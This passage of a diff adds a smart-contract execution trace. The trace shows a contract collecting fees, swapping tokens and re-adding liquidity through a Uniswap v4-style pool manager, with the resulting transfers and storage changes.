+    │   │   │   │   ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   │   │   │   │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000003200d00d04376400000000000f426c2f4cbaa38f5c747e34a3a88f
+    │   │   │   │   │   └─ ← [Return] 79231663191970166433685612957771919 [7.923e34], 276324 [2.763e5], 53261 [5.326e4], 50
+    │   │   │   │   ├─ [35438] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, 0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, 1645274 [1.645e6])
+    │   │   │   │   │   ├─ [34063] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::transfer(0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, 1645274 [1.645e6])
+    │   │   │   │   │   │   ├─ [33363] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::transfer(0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, 1645274 [1.645e6]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: 0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, value: 1645274 [1.645e6])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xe90d223b8475c9f5790ad50dcb63db4fa1daef5714db9dc3ca7133fdc5fd7cee: 0x0000000000000000000000000000000000000000000000000000024f1ecbbf9a → 0x0000000000000000000000000000000000000000000000000000024f1eb2a4c0
+    │   │   │   │   │   │   │   │   @ 0xa01d6646435d947d701d7e6e98ab0ff2bc009460a9830d18dae9aca926b45aa1: 0 → 0x0000000000000000000000000000000000000000000000000000000000191ada
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [32529] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, 1653384169943696843 [1.653e18])
+    │   │   │   │   │   ├─ [31154] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, 1653384169943696843 [1.653e18])
+    │   │   │   │   │   │   ├─ [30294] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, 1653384169943696843 [1.653e18]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: 0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, value: 1653384169943696843 [1.653e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x58df646bd4076229afa8fe0fedaab6e6e245a50bdc922603e2584dd936123a96: 0 → 0x00000000000000000000000000000000000000000000000016f200247ebf85cb
+    │   │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x00000000000000000000000000000000000000000000a85b6b1d7c4e4a341e05 → 0x00000000000000000000000000000000000000000000a85b542b7c29cb74983a
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [9736] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, 0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, 4935823 [4.935e6])
+    │   │   │   │   │   ├─ [8163] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::transfer(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, 4935823 [4.935e6])
+    │   │   │   │   │   │   ├─ [7463] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::transfer(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, 4935823 [4.935e6]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: 0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, value: 4935823 [4.935e6])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xe90d223b8475c9f5790ad50dcb63db4fa1daef5714db9dc3ca7133fdc5fd7cee: 0x0000000000000000000000000000000000000000000000000000024f1eb2a4c0 → 0x0000000000000000000000000000000000000000000000000000024f1e675431
+    │   │   │   │   │   │   │   │   @ 0x287fac87a149f1ce1204434672539805e5d887a348048e67cb7fd368802650bc: 0x0000000000000000000000000000000000000000000000000000000001eab743 → 0x00000000000000000000000000000000000000000000000000000000023607d2
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [8827] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, 4960152509831090529 [4.96e18])
+    │   │   │   │   │   ├─ [7254] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, 4960152509831090529 [4.96e18])
+    │   │   │   │   │   │   ├─ [6394] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, 4960152509831090529 [4.96e18]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: 0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, value: 4960152509831090529 [4.96e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x666a0a2a175e3c128e5ff0edb8f8d92ee7f7485453e2867d672f2e873932369d: 0x0000000000000000000000000000000000000000000000015cd52776784ee0fb → 0x000000000000000000000000000000000000000000000001a1ab27e3f48d725c
+    │   │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x00000000000000000000000000000000000000000000a85b542b7c29cb74983a → 0x00000000000000000000000000000000000000000000a85b0f557bbc4f3606d9
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit FeesCollected(: 6581097 [6.581e6], : 6613536679774787372 [6.613e18])
+    │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 8390192804782497679 [8.39e18]
+    │   │   │   │   │   └─ ← [Return] 8390192804782497679 [8.39e18]
+    │   │   │   │   ├─ [34470] 0x67366782805870060151383F4BbFF9daB53e5cD6::swap(PoolKey({ currency0: 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, currency1: 0xc2132D05D31c914a87C6611C10748AEb04B58e8F, fee: 20, tickSpacing: 1, hooks: 0x0000000000000000000000000000000000000000 }), SwapParams({ zeroForOne: true, amountSpecified: -3047318026697003157 [-3.047e18], sqrtPriceLimitX96: 4295128740 [4.295e9] }), 0x)
+    │   │   │   │   │   ├─  emit topic 0: 0x40e9cecb9f5f1f1c5b9c97dec2917b7ee92e57ba5563708daca94dd84ad7112f
+    │   │   │   │   │   │        topic 1: 0xe1882ad75ae55f11733eb6a8b969fceabf23def0dd9fc8242395ef03f3fd49ff
+    │   │   │   │   │   │        topic 2: 0x000000000000000000000000048e88311ca84876aea086125825492e2af2e5a0
+    │   │   │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffd5b5c0666d14af6b00000000000000000000000000000000000000000000000000000000002e85f50000000000000000000000000000000000000000000010c82b9391898e05e4cf000000000000000000000000000000000000000000000186464dcec47162ede5fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffbc8a10000000000000000000000000000000000000000000000000000000000000019
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x8b2e538b61367ab6db116a167f81f6719b95ca851e61e8f6f696c68dfa6d6197: 0x0000000000000000000000000000000000000000000000161b7211e3afbc352d → 0x0000000000000000000000000000000000000000000000161b721fbf3b47161a
+    │   │   │   │   │   │   @ 0xb13ee341db1b1644ae8e13ff9cfd161357af6e8e82b4cd80b27e3bf814d55d3f: 0x0000000000000000000000000000002650281c242b3d65838e896efb85747661 → 0x0000000000000000000000000000002650281c488743ee7e863c8e5a4d2fd163
+    │   │   │   │   │   │   @ 0xb13ee341db1b1644ae8e13ff9cfd161357af6e8e82b4cd80b27e3bf814d55d3e: 0x000000000014005005fbc8a10000000000000000000010c82b93b00ddf209915 → 0x000000000014005005fbc8a10000000000000000000010c82b9391898e05e4cf
+    │   │   │   │   │   └─ ← [Return] -1036948590885299780564010310454202091077226611333072517643 [-1.036e57]
+    │   │   │   │   ├─ [2791] 0x67366782805870060151383F4BbFF9daB53e5cD6::sync(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063)
+    │   │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 795037327758140267431641 [7.95e23]
+    │   │   │   │   │   │   └─ ← [Return] 795037327758140267431641 [7.95e23]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [4454] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 3047318026697003157 [3.047e18])
+    │   │   │   │   │   ├─ [3594] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 3047318026697003157 [3.047e18]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x048E88311ca84876aeA086125825492e2AF2e5A0, to: 0x67366782805870060151383F4BbFF9daB53e5cD6, value: 3047318026697003157 [3.047e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x7132d8df175a4c9f9cd4430f8e40f3fb90cba8eb144bf6376ed27ab250788cde: 0x000000000000000000000000000000000000000000000000746ff3e71e195f8f → 0x0000000000000000000000000000000000000000000000004a25b44d8b2e0efa
+    │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x00000000000000000000000000000000000000000000a85b0f557bbc4f3606d9 → 0x00000000000000000000000000000000000000000000a85b399fbb55e221576e
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [3392] 0x67366782805870060151383F4BbFF9daB53e5cD6::settle()
+    │   │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 795040375076166964434798 [7.95e23]
+    │   │   │   │   │   │   └─ ← [Return] 795040375076166964434798 [7.95e23]
+    │   │   │   │   │   └─ ← [Return] 3047318026697003157 [3.047e18]
+    │   │   │   │   ├─ [41873] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0xc2132D05D31c914a87C6611C10748AEb04B58e8F, 0x048E88311ca84876aeA086125825492e2AF2e5A0, 3048949 [3.048e6])
+    │   │   │   │   │   ├─ [37800] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::transfer(0x048E88311ca84876aeA086125825492e2AF2e5A0, 3048949 [3.048e6])
+    │   │   │   │   │   │   ├─ [32440] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::transfer(0x048E88311ca84876aeA086125825492e2AF2e5A0, 3048949 [3.048e6]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: 0x048E88311ca84876aeA086125825492e2AF2e5A0, value: 3048949 [3.048e6])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x7132d8df175a4c9f9cd4430f8e40f3fb90cba8eb144bf6376ed27ab250788cde: 0 → 0x00000000000000000000000000000000000000000000000000000000002e85f5
+    │   │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x000000000000000000000000000000000000000000000000000001e01b6c8206 → 0x000000000000000000000000000000000000000000000000000001e01b3dfc11
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [33649] 0x67366782805870060151383F4BbFF9daB53e5cD6::swap(PoolKey({ currency0: 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, currency1: 0xc2132D05D31c914a87C6611C10748AEb04B58e8F, fee: 8, tickSpacing: 1, hooks: 0x0000000000000000000000000000000000000000 }), SwapParams({ zeroForOne: false, amountSpecified: -3048949 [-3.048e6], sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341 [1.461e48] }), 0x)
+    │   │   │   │   │   ├─  emit topic 0: 0x40e9cecb9f5f1f1c5b9c97dec2917b7ee92e57ba5563708daca94dd84ad7112f
+    │   │   │   │   │   │        topic 1: 0xa37d3e6da98dfeb7dc8103a6614f586916a6e04d41ea0a929bc19a029de1a399
+    │   │   │   │   │   │        topic 2: 0x000000000000000000000000048e88311ca84876aea086125825492e2af2e5a0
+    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000002e7e75ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd17a0b000000000000000000000000000000000000000100144d40bfa6e640b957f87b00000000000000000000000000000000000000000000000000083560c7a6b8a50000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd5112a050b4ee6e508ac6604a4b364d8ce770ce82d7a3a374f6625bb0a3ee8cf: 0x0000000000000000000000000000000000000000000000000000000006d7230d → 0x0000000000000000000000000000000000000000000000000000000006d72313
+    │   │   │   │   │   │   @ 0x3d8f1cb2d63d764d39046408b6d02307ca3dc7f58101d3b6cf6aa55dd7d77882: 0x000000000008002002000006000000000000000100144d3b14bd0422ef363323 → 0x000000000008002002000006000000000000000100144d40bfa6e640b957f87b
+    │   │   │   │   │   │   @ 0x3d8f1cb2d63d764d39046408b6d02307ca3dc7f58101d3b6cf6aa55dd7d77884: 0x00000000000000000000000000000000000d5a24bd83bb8a7e35566bdad93d27 → 0x00000000000000000000000000000000000d5a24bd86c73846bd6eeac3d11441
+    │   │   │   │   │   └─ ← [Return] 1036850580479107126326806330082820693349726731 [1.036e45]
+    │   │   │   │   ├─ [26836] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, 0x048E88311ca84876aeA086125825492e2AF2e5A0, 3047029 [3.047e6])
+    │   │   │   │   │   ├─ [25263] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::transfer(0x048E88311ca84876aeA086125825492e2AF2e5A0, 3047029 [3.047e6])
+    │   │   │   │   │   │   ├─ [24563] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::transfer(0x048E88311ca84876aeA086125825492e2AF2e5A0, 3047029 [3.047e6]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: 0x048E88311ca84876aeA086125825492e2AF2e5A0, value: 3047029 [3.047e6])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xe90d223b8475c9f5790ad50dcb63db4fa1daef5714db9dc3ca7133fdc5fd7cee: 0x0000000000000000000000000000000000000000000000000000024f1e675431 → 0x0000000000000000000000000000000000000000000000000000024f1e38d5bc
+    │   │   │   │   │   │   │   │   @ 0xc56fd75288529e6c2cc32e902345d201216092fb027d9ea9d35ff37d6b94e1be: 0 → 0x00000000000000000000000000000000000000000000000000000000002e7e75
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [2762] 0x67366782805870060151383F4BbFF9daB53e5cD6::sync(0xc2132D05D31c914a87C6611C10748AEb04B58e8F)
+    │   │   │   │   │   ├─ [1389] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   │   ├─ [535] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2062041349137 [2.062e12]
+    │   │   │   │   │   │   └─ ← [Return] 2062041349137 [2.062e12]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [6600] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 3048949 [3.048e6])
+    │   │   │   │   │   ├─ [5740] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 3048949 [3.048e6]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x048E88311ca84876aeA086125825492e2AF2e5A0, to: 0x67366782805870060151383F4BbFF9daB53e5cD6, value: 3048949 [3.048e6])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x000000000000000000000000000000000000000000000000000001e01b3dfc11 → 0x000000000000000000000000000000000000000000000000000001e01b6c8206
+    │   │   │   │   │   │   │   @ 0x7132d8df175a4c9f9cd4430f8e40f3fb90cba8eb144bf6376ed27ab250788cde: 0x00000000000000000000000000000000000000000000000000000000002e85f5 → 0
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [3363] 0x67366782805870060151383F4BbFF9daB53e5cD6::settle()
+    │   │   │   │   │   ├─ [1389] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   │   ├─ [535] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2062044398086 [2.062e12]
+    │   │   │   │   │   │   └─ ← [Return] 2062044398086 [2.062e12]
+    │   │   │   │   │   └─ ← [Return] 3048949 [3.048e6]
+    │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 5342874778085494522 [5.342e18]
+    │   │   │   │   │   └─ ← [Return] 5342874778085494522 [5.342e18]
+    │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 3047029 [3.047e6]
+    │   │   │   │   │   └─ ← [Return] 3047029 [3.047e6]
+    │   │   │   │   ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   │   │   │   │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000003200d00d04376400000000000f426c2f4cbaa38f5c747e34a3a88f
+    │   │   │   │   │   └─ ← [Return] 79231663191970166433685612957771919 [7.923e34], 276324 [2.763e5], 53261 [5.326e4], 50
+    │   │   │   │   ├─ [31997] 0x67366782805870060151383F4BbFF9daB53e5cD6::modifyLiquidity((0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 50, 1, 0x0000000000000000000000000000000000000000), (276323 [2.763e5], 276326 [2.763e5], 55923763998605731 [5.592e16], 0x0000000000000000000000000000000000000000000000000000000000000001), 0x)
+    │   │   │   │   │   ├─  emit topic 0: 0xf208f4912782fd25c7f114ca3723a2d5dd6f3bcc3ac8db5af63baa85f711d5ec
+    │   │   │   │   │   │        topic 1: 0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829
+    │   │   │   │   │   │        topic 2: 0x000000000000000000000000048e88311ca84876aea086125825492e2af2e5a0
+    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000043763000000000000000000000000000000000000000000000000000000000004376600000000000000000000000000000000000000000000000000c6ae5df7a3c1a30000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f3: 0x00000000000000000000000000000000000000000000011912ba44bded4f05ca → 0x0000000000000000000000000000000000000000000001191380f31be4f2c76d
+    │   │   │   │   │   │   @ 0x8a76500ba391347340d5b5be6a85d1f5ba8c196ad9c8e8f2c08d922f7fd9ee41: 0x000000000000006d345efa5552b497a0000000000000006d345efa5552b497a0 → 0x000000000000006d3525a8b34a585943000000000000006d3525a8b34a585943
+    │   │   │   │   │   │   @ 0xddf51250bda266bac01096983189b9134cd40848a7c6599656c30ffb872ec358: 0x0000000000000000000000000000000000000000000000055c1802add1489870 → 0x0000000000000000000000000000000000000000000000055cdeb10bc8ec5a13
+    │   │   │   │   │   │   @ 0x337b5bb0f3cad8438abdf61831c1e7f041ff2ebe7f7fd111d47c12aaa2dcd092: 0xffffffffffffffaa5c910976efef3dd90000000000000055a36ef6891010c227 → 0xffffffffffffffaa5bca5b18f84b7c360000000000000055a435a4e707b483ca
+    │   │   │   │   │   └─ ← [Return] 0xffffffffffffffffffffffffffd1818bffffffffffffffffb5e16265a79725760000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [2623] 0x67366782805870060151383F4BbFF9daB53e5cD6::sync(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359)
+    │   │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2538832713148 [2.538e12]
+    │   │   │   │   │   │   └─ ← [Return] 2538832713148 [2.538e12]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [5363] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 3047029 [3.047e6])
+    │   │   │   │   │   ├─ [4663] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 3047029 [3.047e6]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x048E88311ca84876aeA086125825492e2AF2e5A0, to: 0x67366782805870060151383F4BbFF9daB53e5cD6, value: 3047029 [3.047e6])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xe90d223b8475c9f5790ad50dcb63db4fa1daef5714db9dc3ca7133fdc5fd7cee: 0x0000000000000000000000000000000000000000000000000000024f1e38d5bc → 0x0000000000000000000000000000000000000000000000000000024f1e675431
+    │   │   │   │   │   │   │   @ 0xc56fd75288529e6c2cc32e902345d201216092fb027d9ea9d35ff37d6b94e1be: 0x00000000000000000000000000000000000000000000000000000000002e7e75 → 0
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [3224] 0x67366782805870060151383F4BbFF9daB53e5cD6::settle()
+    │   │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2538835760177 [2.538e12]
+    │   │   │   │   │   │   └─ ← [Return] 2538835760177 [2.538e12]
+    │   │   │   │   │   └─ ← [Return] 3047029 [3.047e6]
+    │   │   │   │   ├─ [2791] 0x67366782805870060151383F4BbFF9daB53e5cD6::sync(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063)
+    │   │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 795040375076166964434798 [7.95e23]
+    │   │   │   │   │   │   └─ ← [Return] 795040375076166964434798 [7.95e23]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [4454] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 5340879494341778058 [5.34e18])
+    │   │   │   │   │   ├─ [3594] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 5340879494341778058 [5.34e18]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x048E88311ca84876aeA086125825492e2AF2e5A0, to: 0x67366782805870060151383F4BbFF9daB53e5cD6, value: 5340879494341778058 [5.34e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x00000000000000000000000000000000000000000000a85b399fbb55e221576e → 0x00000000000000000000000000000000000000000000a85b83be58f03a8a31f8
+    │   │   │   │   │   │   │   @ 0x7132d8df175a4c9f9cd4430f8e40f3fb90cba8eb144bf6376ed27ab250788cde: 0x0000000000000000000000000000000000000000000000004a25b44d8b2e0efa → 0x000000000000000000000000000000000000000000000000000716b332c53470
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [3392] 0x67366782805870060151383F4BbFF9daB53e5cD6::settle()
+    │   │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 795045715955661306212856 [7.95e23]
+    │   │   │   │   │   │   └─ ← [Return] 795045715955661306212856 [7.95e23]
+    │   │   │   │   │   └─ ← [Return] 5340879494341778058 [5.34e18]
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x56670d8583b6432cbbf19f76a0913c34917d3e89867d7920b6f0772af74a23e9: 0 → 0x0000000000000000000000000000000000000000000000000000000000646b69
